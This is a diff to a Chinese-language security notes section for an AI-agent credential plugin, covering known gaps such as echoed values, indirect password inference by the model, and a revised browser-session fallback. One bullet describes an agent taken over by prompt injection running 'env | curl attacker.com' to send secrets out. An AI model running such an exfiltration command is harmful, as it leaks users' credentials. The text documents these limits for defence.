@@ -220,7 +220,7 @@ headless profile 无需配置——`dsh-accounts/manage` inject 含 `webServer`�
 - **管理页的回显边界与官方 /api 相同**。管理页对本机用户回显值、允许写 credentials：浏览器扩展（可读本机页面 DOM）、本机恶意软件、以及任何能通过上述四条围栏的同用户进程（如直接 `curl http://127.0.0.1:3080/dsh-accounts/api/accounts/<id>`——Host/origin 头都可以伪造，围栏防的是浏览器侧的 cross-site/rebinding 场景，不是同用户进程）都能读到回显值。这与官方 `/api` 完全同边界，不是本插件引入的新缺口；管理页只是把用户自己在凭据文件里能看到的东西搬到了浏览器里。
 - **browser 快照对 password 域的间接读取无法全封**。武装窗口拦的是已知读取类工具名单，不是能力边界：模型仍可能通过 `browser_click` 引发的页面跳转结果、表单校验报错文案（「密码错误」）、URL 中的 token、页面正文等**间接渠道**推断表单内容；`dsh-builtin-browser` 若新增读取类工具也不在名单内。武装窗口是纵深防御的一层，不是绝对防线。
 - **被完全攻陷的 agent 无解**。若模型已被提示注入或其他方式完全控制，它可以调用 `credential_run` 执行 `env | curl attacker.com` 之类的外传命令——输出虽被脱敏，但秘密已经离开本机。插件层的脱敏拦不住「秘密合法地进入子进程后被子进程外传」。缓解：给敏感账号配 `domains` 白名单、用 `envKeys` 最小化注入、审计 `credential_run` 的调用日志。
-- **回退自开浏览器会话（已知次优）**：`account_fill` 优先复用模型当前正在用的浏览器会话（通过 `dsh-builtin-browser/tool-browser` 的 `internals.sessions` 只读快照）；取不到（如该 agent 尚未开过会话）或包加载失败时，回退 `ctx.browser.open(taskKey)` 自开一个。浏览器 provider 不按 label 去重，回退会**新开一个会话**而不是复用——表现为「代填发生在一个新窗口」，属于已知次优，不是安全问题（域白名单与武装窗口照常生效），但用户体验上请在浏览器里找新开的窗口。另：当前页 URL 完全取不到时域白名单**降级放行并记日志**（防御缺口，记录在案）。
+- **回退自开浏览器会话（已知次优）**：`account_fill` 优先复用模型当前正在用的浏览器会话（通过 `dsh-builtin-browser/tool-browser` 的 `internals.sessions` 只读快照）；取不到（如该 agent 尚未开过会话）或包加载失败时，**先扫快照里其他任务的存活会话**：哪个会话的当前页 host 命中本账号 `domains` 白名单，就复用它（2026-10-15 ccopyright 事故驱动——当时盲开空白页新会话，登录表单在选择器眼里「不存在」，报「setValue 失败（选择器未命中或不可写）」，被误读成页面不可写；跨会话复用受域白名单约束，凭据值不会注入到白名单外的页面，武装窗口按 taskKey 作用域照常生效）。都不命中才回退 `ctx.browser.open(taskKey)` 自开一个。浏览器 provider 不按 label 去重，回退会**新开一个会话**而不是复用——表现为「代填发生在一个新窗口」，属于已知次优，不是安全问题（域白名单与武装窗口照常生效），但用户体验上请在浏览器里找新开的窗口。另：当前页 URL 完全取不到时域白名单**降级放行并记日志**（防御缺口，记录在案）。
 
 ## 部署形态（web profile / headless profile）
 
